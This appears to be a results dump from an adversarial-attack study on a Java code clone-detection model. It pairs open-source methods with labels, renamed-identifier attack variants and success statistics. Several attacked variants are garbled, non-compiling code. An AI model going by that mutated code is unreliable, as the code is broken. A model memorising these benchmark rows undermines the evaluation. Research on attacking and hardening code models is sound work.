            _sout = new PrintWriter(_sock.getOutputStream(), true);
            _sinp = new BufferedReader(new InputStreamReader(_sock.getInputStream()));
            String seed = """";
            Random rand = new Random();
            for (int i = 0; i < 16; i++) {
                String hex = Integer.toHexString(rand.nextInt(256));
                if (hex.length() < 2) hex = ""0"" + hex;
                seed += hex.substring(hex.length() - 2);
            }
            String pass = _mpsw + seed + _spsw;
            MessageDigest md5 = MessageDigest.getInstance(""MD5"");
            md5.reset();
            md5.update(pass.getBytes());
            String hash = hash2hex(md5.digest()).toLowerCase();
            String banner = ""INIT "" + ""servername"" + "" "" + hash + "" "" + seed;
            sendLine(banner);
            String txt = readLine(5);
            if (txt == null) {
                throw new IOException(""Slave did not send banner !!"");
            }
            String sname = """";
            String spass = """";
            String sseed = """";
            try {
                String[] items = txt.split("" "");
                sname = items[1].trim();
                spass = items[2].trim();
                sseed = items[3].trim();
            } catch (Exception e) {
                AsyncSlaveListener.invalidSlave(""INITFAIL BadKey"", _sock);
            }
            pass = _spsw + sseed + _mpsw;
            md5 = MessageDigest.getInstance(""MD5"");
            md5.reset();
            md5.update(pass.getBytes());
            hash = hash2hex(md5.digest()).toLowerCase();
            if (!sname.equals(_name)) {
                AsyncSlaveListener.invalidSlave(""INITFAIL Unknown"", _sock);
            }
            if (!spass.toLowerCase().equals(hash.toLowerCase())) {
                AsyncSlaveListener.invalidSlave(""INITFAIL BadKey"", _sock);
            }
            _cman.getSlaveManager().addSlave(_name, this, getSlaveStatus(), -1);
            start();
        } catch (IOException e) {
            if (e instanceof ConnectIOException && e.getCause() instanceof EOFException) {
                logger.info(""Check slaves.xml on the master that you are allowed to connect."");
            }
            logger.info(""IOException: "" + e.toString());
            try {
                sock.close();
            } catch (Exception e1) {
            }
        } catch (Exception e) {
            logger.warn(""Exception: "" + e.toString());
            try {
                sock.close();
            } catch (Exception e2) {
            }
        }
        System.gc();
    }
",419,,LABEL_1,LABEL_0,,-4,"doPost,request,response,cu,ud,returnTo,password,md,hash,pass,vis",,,,0,,0,Greedy,1,0.0008105913798014323,,[]
239,"    protected void innerProcess(CrawlURI curi) throws InterruptedException {
        if (!curi.isHttpTransaction()) {
            return;
        }
        if (!TextUtils.matches(""^text.*$"", curi.getContentType())) {
            return;
        }
        long maxsize = DEFAULT_MAX_SIZE_BYTES.longValue();
        try {
            maxsize = ((Long) getAttribute(curi, ATTR_MAX_SIZE_BYTES)).longValue();
        } catch (AttributeNotFoundException e) {
            logger.severe(""Missing max-size-bytes attribute when processing "" + curi.getURIString());
        }
        if (maxsize < curi.getContentSize() && maxsize > -1) {
            return;
        }
        String regexpr = """";
        try {
            regexpr = (String) getAttribute(curi, ATTR_STRIP_REG_EXPR);
        } catch (AttributeNotFoundException e2) {
            logger.severe(""Missing strip-reg-exp when processing "" + curi.getURIString());
            return;
        }
        ReplayCharSequence cs = null;
        try {
            cs = curi.getHttpRecorder().getReplayCharSequence();
        } catch (Exception e) {
            curi.addLocalizedError(this.getName(), e, ""Failed get of replay char sequence "" + curi.toString() + "" "" + e.getMessage());
            logger.warning(""Failed get of replay char sequence "" + curi.toString() + "" "" + e.getMessage() + "" "" + Thread.currentThread().getName());
            return;
        }
        MessageDigest digest = null;
        try {
            digest = MessageDigest.getInstance(""SHA1"");
        } catch (NoSuchAlgorithmException e1) {
            e1.printStackTrace();
            return;
        }
        digest.reset();
        String s = null;
        if (regexpr.length() == 0) {
            s = cs.toString();
        } else {
            Matcher m = TextUtils.getMatcher(regexpr, cs);
            s = m.replaceAll("" "");
        }
        digest.update(s.getBytes());
        byte[] newDigestValue = digest.digest();
        if (logger.isLoggable(Level.FINEST)) {
            logger.finest(""Recalculated content digest for "" + curi.getURIString() + "" old: "" + Base32.encode((byte[]) curi.getContentDigest()) + "", new: "" + Base32.encode(newDigestValue));
        }
        curi.setContentDigest(newDigestValue);
    }
 <SPLIT>     public String getServerHash(String passwordHash, String PasswordSalt) throws PasswordHashingException {
        byte[] hash;
        try {
            MessageDigest digest = MessageDigest.getInstance(""SHA-256"");
            digest.reset();
            digest.update(PasswordSalt.getBytes(""UTF-16""));
            hash = digest.digest(passwordHash.getBytes(""UTF-16""));
            return bytesToHex(hash);
        } catch (NoSuchAlgorithmException ex) {
            throw new PasswordHashingException(""Current environment does not supply needed security algorithms. Please update Java"");
        } catch (UnsupportedEncodingException ex) {
            throw new PasswordHashingException(""Current environment does not supply needed character encoding. Please update Java"");
        }
    }
",443,,LABEL_1,LABEL_0,,-4,"innerProcess,curi,maxsize,regexpr,cs,digest,s,m",,,,0,,0,Greedy,1,0.0007054805755615234,,[]
240,"    public void testReadHelloWorldTxt() throws Exception {
        final InputStream helloWorldIS = this.getClass().getClassLoader().getResourceAsStream(BASE_DIR + ""/HelloWorld.txt"");
        FileUtils.forceMkdir(new File(this.testDir.getAbsolutePath() + ""/org/settings4j/contentresolver""));
        final String helloWorldPath = this.testDir.getAbsolutePath() + ""/org/settings4j/contentresolver/HelloWorld.txt"";
        final FileOutputStream fileOutputStream = new FileOutputStream(new File(helloWorldPath));
        IOUtils.copy(helloWorldIS, fileOutputStream);
        IOUtils.closeQuietly(helloWorldIS);
        IOUtils.closeQuietly(fileOutputStream);
        LOG.info(""helloWorldPath: "" + helloWorldPath);
        final FSContentResolver contentResolver = new FSContentResolver();
        contentResolver.setRootFolderPath(this.testDir.getAbsolutePath());
        byte[] content = contentResolver.getContent(""org/settings4j/contentresolver/HelloWorld.txt"");
        assertNotNull(content);
        assertEquals(""Hello World"", new String(content, ""UTF-8""));
        content = contentResolver.getContent(""file:org/settings4j/contentresolver/HelloWorld.txt"");
        assertNotNull(content);
        assertEquals(""Hello World"", new String(content, ""UTF-8""));
        content = contentResolver.getContent(""file:/org/settings4j/contentresolver/HelloWorld.txt"");
        assertNotNull(content);
        assertEquals(""Hello World"", new String(content, ""UTF-8""));
        content = contentResolver.getContent(""file:laksjdhalksdhfa"");
        assertNull(content);
        content = contentResolver.getContent(""/org/settings4j/contentresolver/HelloWorld.txt"");
        assertNotNull(content);
        assertEquals(""Hello World"", new String(content, ""UTF-8""));
    }
 <SPLIT>     public void buildSiteForEdit(String sBasePath, String sOutputPath, String sCtrlPath, String sMenuPath, String sIntegradorPath, String sSelPageOptions, Properties oEnvironmentProps, Properties oUserProps) throws IOException, DOMException, TransformerException, TransformerConfigurationException, MalformedURLException {
        Transformer oTransformer;
        StreamResult oStreamResult;
        StreamSource oStreamSrcXML;
        StringWriter oStrWritter;
        InputStream oXMLStream = null;
        String sTransformed;
        StringBuffer oPostTransform;
        String sKey;
        String sMedia;
        Object sVal;
        Page oCurrentPage;
        int iCloseHead, iOpenBody, iCloseBody;
        int iReaded;
        char CharBuffer[] = new char[8192];
        String sCharBuffer;
        long lElapsed = 0;
        final String sSep = System.getProperty(""file.separator"");
        if (DebugFile.trace) {
            lElapsed = System.currentTimeMillis();
            DebugFile.writeln(""Begin Pageset.buildSiteForEdit("" + sBasePath + "","" + sOutputPath + "","" + sCtrlPath + "","" + sMenuPath + "")"");
            DebugFile.incIdent();
        }
        FileSystem oFS = new FileSystem();
        Vector vPages = pages();
        if (!sBasePath.endsWith(sSep)) sBasePath += sSep;
        String sWebServer = oEnvironmentProps.getProperty(""webserver"", """");
        if (DebugFile.trace && sWebServer.length() == 0) DebugFile.writeln(""WARNING: webserver property not set at EnvironmentProperties"");
        if (!sWebServer.endsWith(""/"")) sWebServer += ""/"";
        Node oContainers = oMSite.seekChildByName(oMSite.getRootNode().getFirstChild(), ""containers"");
        if (oContainers == null) {
            if (DebugFile.trace) DebugFile.writeln(""ERROR: <containers> node not found."");
            throw new DOMException(DOMException.NOT_FOUND_ERR, ""<containers> node not found"");
        }
        if (DebugFile.trace) DebugFile.writeln(""new FileInputStream("" + (sURI.startsWith(""file://"") ? sURI.substring(7) : sURI) + "")"");
        for (int c = 0; c < vPages.size(); c++) {
            oCurrentPage = (Page) vPages.get(c);
            oXMLStream = new FileInputStream(sURI.startsWith(""file://"") ? sURI.substring(7) : sURI);
            oStreamSrcXML = new StreamSource(oXMLStream);
            oStrWritter = new StringWriter();
            oStreamResult = new StreamResult(oStrWritter);
            try {
                oTransformer = StylesheetCache.newTransformer(sBasePath + ""xslt"" + sSep + ""templates"" + sSep + oMSite.name() + sSep + oCurrentPage.template());
                sMedia = oTransformer.getOutputProperty(OutputKeys.MEDIA_TYPE);
                if (DebugFile.trace) DebugFile.writeln(OutputKeys.MEDIA_TYPE + ""="" + sMedia);
                if (null == sMedia) sMedia = ""html""; else sMedia = sMedia.substring(sMedia.indexOf('/') + 1);
                if (null == oCurrentPage.getTitle()) throw new NullPointerException(""Page "" + String.valueOf(c) + "" title is null"");
                if (DebugFile.trace) DebugFile.writeln(""Page.filePath("" + sOutputPath + oCurrentPage.getTitle().replace(' ', '_') + ""."" + sMedia + "")"");
                oCurrentPage.filePath(sOutputPath + oCurrentPage.getTitle().replace(' ', '_') + ""."" + sMedia);
                StylesheetCache.setParameters(oTransformer, oEnvironmentProps);
                StylesheetCache.setParameters(oTransformer, oUserProps);
                oTransformer.setParameter(""param_page"", ((Page) (vPages.get(c))).getTitle());
                oTransformer.transform(oStreamSrcXML, oStreamResult);
            } catch (TransformerConfigurationException e) {
                oLastXcpt = e;
                sMedia = null;
                SourceLocator sl = e.getLocator();
                if (DebugFile.trace) {
                    if (sl == null) {
                        DebugFile.writeln(""ERROR TransformerConfigurationException "" + e.getMessage());
                    } else {
                        DebugFile.writeln(""ERROR TransformerConfigurationException "" + e.getMessage() + "" line="" + String.valueOf(sl.getLineNumber()) + "" column="" + String.valueOf(sl.getColumnNumber()));
                    }
                }
            } catch (TransformerException e) {
                oLastXcpt = e;
                sMedia = null;
                if (DebugFile.trace) DebugFile.writeln(""ERROR TransformerException "" + e.getMessageAndLocation());
            }
            oTransformer = null;
            oStreamResult = null;
            sTransformed = oStrWritter.toString();
            if (DebugFile.trace) DebugFile.writeln(""transformation length="" + String.valueOf(sTransformed.length()));
            if (sTransformed.length() > 0) {
                iCloseHead = sTransformed.indexOf(""</head"");
                if (iCloseHead < 0) iCloseHead = sTransformed.indexOf(""</HEAD"");
                iOpenBody = sTransformed.indexOf(""<body"", iCloseHead);
                if (iOpenBody < 0) iOpenBody = sTransformed.indexOf(""<BODY"", iCloseHead);
                iCloseBody = sTransformed.indexOf("">"", iOpenBody + 5);
                for (char s = sTransformed.charAt(iCloseBody + 1); s == '\r' || s == '\n' || s == ' ' || s == '\t'; s = sTransformed.charAt(++iCloseBody)) ;
                oPostTransform = new StringBuffer(sTransformed.length() + 4096);
                oPostTransform.append(sTransformed.substring(0, iCloseHead));
                oPostTransform.append(""\n<script language=\""JavaScript\"" src=\"""" + sMenuPath + ""\""></script>"");
                oPostTransform.append(""\n<script language=\""JavaScript\"" src=\"""" + sIntegradorPath + ""\""></script>\n"");
                oPostTransform.append(sTransformed.substring(iCloseHead, iCloseHead + 7));
                oPostTransform.append(sTransformed.substring(iOpenBody, iCloseBody));
                try {
                    sCharBuffer = oFS.readfilestr(sCtrlPath, ""UTF-8"");
                    if (DebugFile.trace) DebugFile.writeln(String.valueOf(sCharBuffer.length()) + "" characters readed"");
                } catch (com.enterprisedt.net.ftp.FTPException ftpe) {
                    throw new IOException(ftpe.getMessage());
                }
                try {
                    if (DebugFile.trace) DebugFile.writeln(""Gadgets.replace("" + sCtrlPath + "",http://demo.hipergate.com/,"" + sWebServer + "")"");
                    Gadgets.replace(sCharBuffer, ""http://demo.hipergate.com/"", sWebServer);
                } catch (org.apache.oro.text.regex.MalformedPatternException e) {
                }
                oPostTransform.append(""<!--Begin "" + sCtrlPath + ""-->\n"");
                oPostTransform.append(sCharBuffer);
                sCharBuffer = null;
                oPostTransform.append(""\n<!--End "" + sCtrlPath + ""-->\n"");
                oPostTransform.append(sTransformed.substring(iCloseBody));
            } else {
                oPostTransform = new StringBuffer(""Page "" + ((Page) vPages.get(c)).getTitle() + "" could not be rendered."");
                if (oLastXcpt != null) oPostTransform.append(""<BR>"" + oLastXcpt.getMessageAndLocation());
            }
            if (DebugFile.trace) DebugFile.writeln(""new FileWriter("" + sOutputPath + oCurrentPage.getTitle().replace(' ', '_') + ""_."" + sMedia + "")"");
            if (sSelPageOptions.length() == 0) oFS.writefilestr(sOutputPath + oCurrentPage.getTitle().replace(' ', '_') + ""_."" + sMedia, oPostTransform.toString(), ""UTF-8""); else try {
                oFS.writefilestr(sOutputPath + oCurrentPage.getTitle().replace(' ', '_') + ""_."" + sMedia, Gadgets.replace(oPostTransform.toString(), "":selPageOptions"", sSelPageOptions), ""UTF-8"");
            } catch (Exception e) {
            }
            oPostTransform = null;
            sTransformed = null;
        }
        oXMLStream.close();
        if (DebugFile.trace) {
            DebugFile.writeln(""done in "" + String.valueOf(System.currentTimeMillis() - lElapsed) + "" miliseconds"");
            DebugFile.decIdent();
            DebugFile.writeln(""End Pageset.buildSiteForEdit()"");
        }
    }
",291,,LABEL_1,LABEL_1,LABEL_1,-1,"testReadHelloWorldTxt,helloWorldIS,helloWorldPath,fileOutputStream,contentResolver,content",,,,0,,0,GA,2282,1.0033761262893677,failed,[]
241,"    public static final synchronized String hash(String data) {
        if (digest == null) {
            try {
                digest = MessageDigest.getInstance(""MD5"");
            } catch (NoSuchAlgorithmException nsae) {
                System.err.println(""Failed to load the MD5 MessageDigest. "" + ""Jive will be unable to function normally."");
                nsae.printStackTrace();
            }
        }
        digest.update(data.getBytes());
        return toHex(digest.digest());
    }
 <SPLIT>     private void generateDeviceUUID() {
        try {
            MessageDigest md5 = MessageDigest.getInstance(""MD5"");
            md5.update(deviceType.getBytes());
            md5.update(internalId.getBytes());
            md5.update(bindAddress.getHostName().getBytes());
            StringBuffer hexString = new StringBuffer();
            byte[] digest = md5.digest();
            for (int i = 0; i < digest.length; i++) {
                hexString.append(Integer.toHexString(0xFF & digest[i]));
            }
            uuid = hexString.toString().toUpperCase();
        } catch (Exception ex) {
            RuntimeException runTimeEx = new RuntimeException(""Unexpected error during MD5 hash creation, check your JRE"");
            runTimeEx.initCause(ex);
            throw runTimeEx;
        }
    }
",84,,LABEL_1,LABEL_1,LABEL_1,-1,"hash,data,digest",,,,0,,0,GA,1150,0.40832421779632566,failed,[]
242,"    private String executePost(String targetURL, String urlParameters) {
        URL url;
        HttpURLConnection connection = null;
        try {
            url = new URL(targetURL);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod(""POST"");
            connection.setRequestProperty(""Content-Type"", ""application/x-www-form-urlencoded"");
            connection.setRequestProperty(""Content-Length"", """" + Integer.toString(urlParameters.getBytes().length));
            connection.setRequestProperty(""Content-Language"", ""en-US"");
            connection.setUseCaches(false);
            connection.setDoInput(true);
            connection.setDoOutput(true);
            DataOutputStream wr = new DataOutputStream(connection.getOutputStream());
            wr.writeBytes(urlParameters);
            wr.flush();
            wr.close();
            InputStream is = connection.getInputStream();
            BufferedReader rd = new BufferedReader(new InputStreamReader(is));
            String line;
            StringBuffer response = new StringBuffer();
            while ((line = rd.readLine()) != null) {
                response.append(line);
                response.append('\r');
            }
            rd.close();
            return response.toString();
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }
 <SPLIT>     public static void main(String[] args) throws Exception {
        int result = 20;
        if (args.length == 1) {
            StringBuffer urlString = new StringBuffer(args[0]);
            if (urlString.lastIndexOf(""/"") != urlString.length() - 1) {
                urlString.append('/');
            }
            urlString.append(""GetConfig.jsp"");
            URLConnection conn = new URL(urlString.toString()).openConnection();
            System.out.println(Configuration.readObject(conn.getInputStream()));
            result = 0;
        } else {
            System.err.println(""usage: GetConfig <URL>"");
        }
        System.exit(result);
    }
",265,,LABEL_0,LABEL_0,LABEL_0,-1,"executePost,targetURL,urlParameters,url,connection,wr,is,rd,line,response",,,,0,,0,GA,3721,1.3547026832898459,failed,[]
243,"    public static void copy(String fileFrom, String fileTo) throws IOException {
        FileInputStream inputStream = null;
        FileOutputStream outputStream = null;
        FileChannel inputChannel = null;
        FileChannel outputChannel = null;
        try {
            inputStream = new FileInputStream(fileFrom);
            outputStream = new FileOutputStream(fileTo);
            inputChannel = inputStream.getChannel();
            outputChannel = outputStream.getChannel();
            inputChannel.transferTo(0, inputChannel.size(), outputChannel);
        } finally {
            try {
                inputChannel.close();
            } finally {
                try {
                    outputChannel.close();
                } finally {
                    try {
                        inputStream.close();
                    } finally {
                        outputStream.close();
                    }
                }
            }
        }
    }
 <SPLIT>     @Override
    public File call() throws IOException {
        HttpURLConnection conn = null;
        ReadableByteChannel fileDownloading = null;
        FileChannel fileWriting = null;
        try {
            conn = (HttpURLConnection) url.openConnection();
            if (size == -1) {
                size = conn.getContentLength();
            }
            fileDownloading = Channels.newChannel(conn.getInputStream());
            fileWriting = new FileOutputStream(file).getChannel();
            long left = size;
            long chunkSize = BLOCK_SIZE;
            for (long downloaded = 0; downloaded < size; left = size - downloaded) {
                if (left < BLOCK_SIZE) {
                    chunkSize = left;
                }
                fileWriting.transferFrom(fileDownloading, downloaded, chunkSize);
                downloaded += chunkSize;
                setProgress(downloaded);
            }
        } finally {
            if (file != null) {
                file.deleteOnExit();
            }
            if (conn != null) {
                conn.disconnect();
            }
            if (fileDownloading != null) {
                try {
                    fileDownloading.close();
                } catch (IOException ioe) {
                    Helper.logger.log(Level.SEVERE, ""Не удалось закрыть поток скачивания"", ioe);
                }
            }
            if (fileWriting != null) {
                try {
                    fileWriting.close();
                } catch (IOException ioe) {
                    Helper.logger.log(Level.SEVERE, ""Не удалось закрыть поток записи в файл"", ioe);
                }
            }
        }
        return file;
    }
",131,,LABEL_0,LABEL_0,LABEL_0,-1,"copy,fileFrom,fileTo,inputStream,outputStream,inputChannel,outputChannel",,,,0,,0,GA,2286,0.8316890358924866,failed,[]
244,"    public DataRecord addRecord(InputStream input) throws DataStoreException {
        File temporary = null;
        try {
            temporary = newTemporaryFile();
            DataIdentifier tempId = new DataIdentifier(temporary.getName());
            usesIdentifier(tempId);
            long length = 0;
            MessageDigest digest = MessageDigest.getInstance(DIGEST);
            OutputStream output = new DigestOutputStream(new FileOutputStream(temporary), digest);
            try {
                length = IOUtils.copyLarge(input, output);
            } finally {
                output.close();
            }
            DataIdentifier identifier = new DataIdentifier(digest.digest());
            File file;
            synchronized (this) {
                usesIdentifier(identifier);
                file = getFile(identifier);
                if (!file.exists()) {
                    File parent = file.getParentFile();
                    parent.mkdirs();
                    if (temporary.renameTo(file)) {
                        temporary = null;
                    } else {
                        throw new IOException(""Can not rename "" + temporary.getAbsolutePath() + "" to "" + file.getAbsolutePath() + "" (media read only?)"");
                    }
                } else {
                    long now = System.currentTimeMillis();
                    if (getLastModified(file) < now + ACCESS_TIME_RESOLUTION) {
                        setLastModified(file, now + ACCESS_TIME_RESOLUTION);
                    }
                }
                if (file.length() != length) {
                    if (!file.isFile()) {
                        throw new IOException(""Not a file: "" + file);
                    }
                    throw new IOException(DIGEST + "" collision: "" + file);
                }
            }
            inUse.remove(tempId);
            return new FileDataRecord(identifier, file);
        } catch (NoSuchAlgorithmException e) {
            throw new DataStoreException(DIGEST + "" not available"", e);
        } catch (IOException e) {
            throw new DataStoreException(""Could not add record"", e);
        } finally {
            if (temporary != null) {
                temporary.delete();
            }
        }
    }
 <SPLIT>     private static void readAndRewrite(File inFile, File outFile) throws IOException {
        ImageInputStream iis = ImageIO.createImageInputStream(new BufferedInputStream(new FileInputStream(inFile)));
        DcmParser dcmParser = DcmParserFactory.getInstance().newDcmParser(iis);
        Dataset ds = DcmObjectFactory.getInstance().newDataset();
        dcmParser.setDcmHandler(ds.getDcmHandler());
        dcmParser.parseDcmFile(null, Tags.PixelData);
        PixelDataReader pdReader = pdFact.newReader(ds, iis, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        System.out.println(""reading "" + inFile + ""..."");
        pdReader.readPixelData(false);
        ImageOutputStream out = ImageIO.createImageOutputStream(new BufferedOutputStream(new FileOutputStream(outFile)));
        DcmEncodeParam dcmEncParam = DcmEncodeParam.IVR_LE;
        ds.writeDataset(out, dcmEncParam);
        ds.writeHeader(out, dcmEncParam, Tags.PixelData, dcmParser.getReadVR(), dcmParser.getReadLength());
        System.out.println(""writing "" + outFile + ""..."");
        PixelDataWriter pdWriter = pdFact.newWriter(pdReader.getPixelDataArray(), false, ds, out, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        pdWriter.writePixelData();
        out.flush();
        out.close();
        System.out.println(""done!"");
    }
",356,"    public DataRecord  addrecord(InputStream back) throws DataStoreException {
        File tommanent = null;
        try {
            tommanent = newTemporaryFile();
            DataIdentifier inputPath = new DataIdentifier(tommanent.getName());
            usesIdentifier(inputPath);
            long string = 0;
            MessageDigest digist = MessageDigest.getInstance(DIGEST);
            OutputStream write = new DigestOutputStream(new FileOutputStream(tommanent), digist);
            try {
               stringh = IOUtils.copyLarge(back, write);
            } finally {
                write.close();
            }
            DataIdentifier identifier = new DataIdentifier(digist.digist());
            File url;
            synchronized (this) {
                usesIdentifier(identifier);
                url = getFile(identifier);
                if (!url.exists()) {
                    Filelocationt = url.getParentFile();
                    location.mkdirs();
                    if (tommanent.renameTo(url)) {
                        tommanent = null;
                    } else {
                        throw new IOException(""Can not rename "" + tommanent.getAbsolutePath() + "" to "" + url.getAbsolutePath() + "" (media read only?)"");
                    }
                } else {
                    long start = System.currentTimeMillis();
                    if (getLastModified(url) < start + ACCESS_TIME_RESOLUTION) {
                        setLastModified(url, start + ACCESS_TIME_RESOLUTION);
                    }
                }
                if (url.string() != string) {
                    if (!url.isFile()) {
                        throw new IOException(""Not a file: "" + url);
                    }
                    throw new IOException(DIGEST + "" collision: "" + url);
                }
            }
            inUse.remove(inputPath);
            return new FileDataRecord(identifier, url);
        } catch (NoSuchAlgorithmException e) {
            throw new DataStoreException(DIGEST + "" not available"", e);
        } catch (IOException e) {
            throw new DataStoreException(""Could not add record"", e);
        } finally {
            if (tommanent != null) {
                tommanent.delete();
            }
        }
    }
",LABEL_1,LABEL_1,0.905625581741333,1,"addRecord,input,temporary,tempId,length,digest,output,file,parent,now",,,,0,"addRecord: addrecord,input:back,temporary:tommanent,tempId:inputPath,length:string,digest:digist,output:write,file:url,parent:location,now:start,",0,GA,1093,0.41871373653411864,ga,[]
245,"    public static String load(String id) {
        String xml = """";
        if (id.length() < 5) return """";
        try {
            working = true;
            URL url = new URL(""http://pastebin.com/download.php?i="" + id);
            URLConnection conn = url.openConnection();
            BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()));
            xml = """";
            String str;
            while ((str = reader.readLine()) != null) {
                xml += str;
            }
            reader.close();
            working = false;
            return xml.toString();
        } catch (IOException ex) {
            JOptionPane.showMessageDialog(null, "" Load error"");
        }
        working = false;
        return xml;
    }
 <SPLIT>     public static void copy(String fromFile, String toFile) throws IOException {
        File inputFile = new File(fromFile);
        File outputFile = new File(toFile);
        FileReader in = new FileReader(inputFile);
        FileWriter out = new FileWriter(outputFile);
        int c;
        while ((c = in.read()) != -1) out.write(c);
        in.close();
        out.close();
    }
",147,"    public static String show(String f) {
        String file = """";
        if (f.length() < 5) return """";
        try {
            working = true;
            URLstringl = new URL(""http://pastebin.com/download.php?i="" + f);
            URLConnection conclientstring.openConnection();
            BufferedReader reareadernew BufferedReader(new InputStreamReader(string.openStream()));
            file = """";
            String l;
            while ((l = reader.readLine()) != null) {
                file += l;
            }
            reader.close();
            working = false;
            return file.toString();
        } catch (IOException ex) {
            JOptionPane.showMessageDialog(null, "" Load error"");
        }
        working = false;
        return file;
    }
",LABEL_0,LABEL_0,0.5305774211883545,1,"load,id,xml,url,conn,reader,str",,,,3,"load:show,id:f,xml:file,url:string,conn:client,reader:reader,str:l,",1,GA,529,0.1892190376917521,ga,[]
246,"    public static Collection<Tuple<String, ArrayList<String>>> readGeoParserResult(String recordContent, boolean getGazeteerIds) {
        if (TESTING) {
            HashSet<Tuple<String, ArrayList<String>>> ret = new HashSet<Tuple<String, ArrayList<String>>>();
            ret.add(new Tuple<String, ArrayList<String>>(""teste"", new ArrayList<String>()));
            return ret;
        }
        int retries = 0;
        while (retries < 3) {
            try {
                ArrayList<Tuple<String, ArrayList<String>>> ret = new ArrayList<Tuple<String, ArrayList<String>>>();
                String reqPre = ""<?xml version=\""1.0\""?>\r\n"" + (getGazeteerIds ? ""<GetFeature"" : ""<GetParsing"") + "" xmlns=\""http://www.opengis.net/gp\"" xmlns:wfs=\""http://www.opengis.net/wfs\"""" + "" xmlns:xsi=\""http://www.w3.org/2000/10/XMLSchema-instance\"""" + "" xsi:schemaLocation=\""http://www.opengis.net/gp ../gp/GetFeatureRequest.xsd http://www.opengis.net/wfs ../wfs/GetFeatureRequest.xsd\""\r\n"" + "" wfs:outputFormat=\""GML2\"">"" + ""<wfs:Query wfs:TypeName=\""PlaceName\"" />"" + ""<Resource mine=\""text/plain\"">"" + ""<Contents></Contents>"" + ""</Resource>"" + (getGazeteerIds ? ""</GetFeature>"" : ""</GetParsing>"");
                Document doc = DocumentHelper.parseText(reqPre);
                doc.getRootElement().element(""Resource"").element(""Contents"").setText(recordContent);
                URL url = new URL(geoParserBaseUrl + ""?request="" + URLEncoder.encode(doc.asXML(), ""ISO8859-1""));
                InputStreamReader reader = new InputStreamReader(url.openStream(), ""UTF-8"");
                BufferedReader buffered = new BufferedReader(reader);
                StringBuffer sb = new StringBuffer();
                String line;
                while ((line = buffered.readLine()) != null) {
                    sb.append(line);
                }
                Document d = DocumentHelper.parseText(sb.toString());
                HashSet<String> places = new HashSet<String>();
                for (Iterator<Element> it = d.getRootElement().element(""EntryCollection"").elementIterator(""PlaceName""); it.hasNext(); ) {
                    Element plcEl = it.next();
                    String val = plcEl.elementTextTrim(""TermName"");
                    if (!val.equals("""") && !places.contains(val)) {
                        places.add(val);
                        String entryID = plcEl.attributeValue(""entryID"");
                        Tuple<String, ArrayList<String>> plc = new Tuple<String, ArrayList<String>>(val, new ArrayList<String>());
                        for (Iterator<Element> it2 = d.getRootElement().element(""EntryCollection"").elementIterator(""GazetteerEntry""); it2.hasNext(); ) {
                            Element idEl = it2.next();
                            if (idEl.attributeValue(""entryID"").equals(entryID)) plc.getV2().add(idEl.attributeValue(""id""));
                        }
                        ret.add(plc);
                    }
                }
                return ret;
            } catch (Exception e) {
                log.debug(""Erro ao pesquisar a lista de termos para o registo "" + recordContent + ""! "" + e.getMessage(), e);
                System.out.println(""Erro ao pesquisar a lista de termos para o registo "" + recordContent + ""! "" + e.getMessage());
                retries++;
            }
        }
        System.out.println(""Too many retries. Giving up."");
        return new HashSet<Tuple<String, ArrayList<String>>>();
    }
 <SPLIT>     public Object sendRequestObjectResponse(java.lang.String servletName, java.lang.String request) {
        String osRoot = OSRoot.getRoot();
        String fname = """";
        Object retobj = null;
        String myurl = java.util.prefs.Preferences.systemRoot().get(""serverurl"", """");
        String myport = java.util.prefs.Preferences.systemRoot().get(""portno"", ""8080"");
        if (myport == null || myport.trim().equals("""")) {
            myport = ""80"";
        }
        if (this.serverURL == null) {
            try {
                java.net.URL codebase = newgen.presentation.NewGenMain.getAppletInstance().getCodeBase();
                if (codebase != null) serverURL = codebase.getHost(); else serverURL = ""localhost"";
            } catch (Exception exp) {
                exp.printStackTrace();
                serverURL = ""localhost"";
            }
            newgen.presentation.component.IPAddressPortNoDialog ipdig = new newgen.presentation.component.IPAddressPortNoDialog(myurl, myport);
            ipdig.show();
            serverURL = myurl = ipdig.getIPAddress();
            myport = ipdig.getPortNo();
            java.util.prefs.Preferences.systemRoot().put(""serverurl"", serverURL);
            java.util.prefs.Preferences.systemRoot().put(""portno"", myport);
            System.out.println(serverURL);
        }
        try {
            System.out.println(""http://"" + serverURL + "":"" + myport + ""/newgenlibctxt/"" + servletName);
            java.net.URL url = new java.net.URL(""http://"" + serverURL + "":"" + myport + ""/newgenlibctxt/"" + servletName);
            java.net.URLConnection urlconn = (java.net.URLConnection) url.openConnection();
            urlconn.setDoOutput(true);
            urlconn.setRequestProperty(""Content-type"", ""text/xml; charset=UTF-8"");
            java.io.OutputStream os = urlconn.getOutputStream();
            String req1xml = request;
            java.util.zip.CheckedOutputStream cos = new java.util.zip.CheckedOutputStream(os, new java.util.zip.Adler32());
            java.util.zip.GZIPOutputStream gop = new java.util.zip.GZIPOutputStream(cos);
            java.io.OutputStreamWriter dos = new java.io.OutputStreamWriter(gop, ""UTF-8"");
            System.out.println(req1xml);
            try {
                java.io.FileOutputStream pw = new java.io.FileOutputStream(""log.txt"");
                pw.write(req1xml.getBytes());
                pw.flush();
                pw.close();
            } catch (Exception exp) {
                exp.printStackTrace();
            }
            dos.write(req1xml);
            dos.flush();
            dos.close();
            System.out.println(""url conn: "" + urlconn.getContentEncoding() + ""  "" + urlconn.getContentType());
            java.io.InputStream ios = urlconn.getInputStream();
            java.io.File f1 = new java.io.File(osRoot + ""/localattachments/Reports"");
            if (!f1.exists()) f1.mkdirs();
            java.io.File file = null;
            if (urlconn.getContentType() != null && urlconn.getContentType().trim().equals(""application/vnd.oasis.opendocument.text"")) {
                file = new java.io.File(osRoot + ""/localattachments/Reports/"" + System.currentTimeMillis() + "".odt"");
            } else if (urlconn.getContentType() != null && urlconn.getContentType().trim().equals(""text/html"")) {
                file = new java.io.File(osRoot + ""/localattachments/Reports/"" + System.currentTimeMillis() + "".html"");
            } else {
                file = new java.io.File(osRoot + ""/localattachments/Reports/"" + System.currentTimeMillis() + "".xls"");
            }
            file = new java.io.File(file.getAbsolutePath());
            java.io.FileOutputStream fos = new java.io.FileOutputStream(file);
            int c;
            while ((c = ios.read()) != -1) fos.write(c);
            fos.close();
            ios.close();
            fname = file.getAbsolutePath();
            System.out.println(fname);
